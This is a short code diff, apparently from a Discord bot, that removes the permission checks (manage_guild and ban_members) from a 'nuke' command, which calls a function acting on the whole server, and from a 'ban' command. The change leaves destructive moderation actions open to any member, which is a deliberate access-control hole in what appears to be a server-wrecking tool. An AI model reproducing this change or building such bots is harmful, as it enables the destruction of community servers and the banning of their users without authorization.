@@ -304,7 +304,6 @@ async def perform_nuke(guild):
 
 
 @bot.command()
-@commands.has_permissions(manage_guild=True)  
 async def nuke(ctx):
     guild = ctx.guild
 
@@ -391,7 +390,6 @@ async def create(ctx, *, name: str):
 
 
 @bot.command()
-@commands.has_permissions(ban_members=True)
 async def ban(ctx):
     noban_ids = [ID, ID]
 
